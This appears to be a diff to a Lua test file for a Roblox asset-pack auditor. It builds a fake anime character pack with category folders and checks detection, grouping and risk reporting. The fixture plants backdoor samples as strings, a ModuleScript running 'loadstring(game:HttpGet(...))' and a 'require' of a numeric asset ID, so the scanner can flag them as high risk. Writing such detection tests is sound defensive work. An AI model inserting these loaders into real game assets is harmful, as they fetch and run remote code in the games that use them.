@@ -20,10 +20,13 @@ local function part(className, name, parent)
 end
 
 local pack = Instance.new("Folder")
-pack.Name = "AnimePack"
+pack.Name = "Anime Pack"
+local naruto = part("Folder", "NARUTO", pack)
+local other = part("Folder", "OTHER", pack)
+local dbz = part("Folder", "DBZ", pack)
 
 -- 1) R15 "Ninja" com katana, cabelo, VFX, animação e um script backdoor
-local ninja = part("Model", "Ninja", pack)
+local ninja = part("Model", "Ninja", naruto)
 part("Humanoid", "Humanoid", ninja)
 part("Part", "HumanoidRootPart", ninja)
 for _, name in { "Head", "UpperTorso", "LowerTorso", "LeftUpperArm", "RightUpperArm", "LeftUpperLeg", "RightUpperLeg", "LeftHand", "RightFoot" } do
@@ -50,7 +53,7 @@ local fx = part("LocalScript", "SpinFX", ninja)
 fx.Source = "local TweenService = game:GetService('TweenService')\n-- rotate\n"
 
 -- 2) R6 simples com roupas e rosto
-local guy = part("Model", "Student", pack)
+local guy = part("Model", "Student", other)
 part("Humanoid", "Humanoid", guy)
 part("Part", "HumanoidRootPart", guy)
 local head = part("Part", "Head", guy)
@@ -73,6 +76,13 @@ part("AnimationController", "AnimationController", statue)
 part("Part", "Body", statue)
 
 -- Script solto fora de personagem
+-- Formas do mesmo personagem (DBZ): Goku, Goku SSJ, Goku (Ultra Instinct) + Vegeta
+for _, name in { "Goku", "Goku SSJ", "Goku (Ultra Instinct)", "Vegeta" } do
+	local m = part("Model", name, dbz)
+	part("Humanoid", "Humanoid", m)
+	part("Part", "HumanoidRootPart", m)
+end
+
 local loose = part("ModuleScript", "Loader", pack)
 loose.Source = "return loadstring(game:HttpGet('x'))"
 
@@ -85,7 +95,20 @@ local byName = {}
 for _, c in report.characters do
 	byName[c.name] = c
 end
-check(#report.characters == 3, "acha os 3 personagens (Model com Humanoid/AnimationController)")
+check(#report.characters == 7, "acha os 7 personagens dentro das pastas (Model com Humanoid/AnimationController)")
+check(byName.Ninja.category == "NARUTO" and byName.Student.category == "OTHER" and byName.Goku.category == "DBZ" and byName.Statue.category == "(raiz)", "categoria = pasta do pack (DBZ, NARUTO...)")
+local gokuForms = nil
+for _, group in report.forms do
+	if group.base == "goku" then
+		gokuForms = group
+	end
+end
+check(gokuForms ~= nil and #gokuForms.members == 3 and table.find(gokuForms.members, "Vegeta") == nil, "formas: Goku / Goku SSJ / Goku (Ultra Instinct) agrupados; Vegeta fora")
+check(PackAudit.baseName("Naruto Sage Mode") == "naruto" and PackAudit.baseName("Ichigo (Bankai)") == "ichigo", "nome base remove palavras de forma")
+local summary = PackAudit.summary(report)
+check(#summary.characters == 7 and summary.categories.DBZ == 4, "resumo JSON por personagem/categoria")
+local dump = PackAudit.scriptDump(roots)
+check(string.find(dump, "require(123456789)", 1, true) ~= nil and string.find(dump, "risco ALTO", 1, true) ~= nil, "código dos scripts exportado como TEXTO para revisão")
 check(byName.Ninja and byName.Ninja.rig == "R15", "Ninja = R15")
 check(byName.Student and byName.Student.rig == "R6", "Student = R6")
 check(byName.Statue and string.sub(byName.Statue.rig, 1, 6) == "custom", "Statue = rig custom")
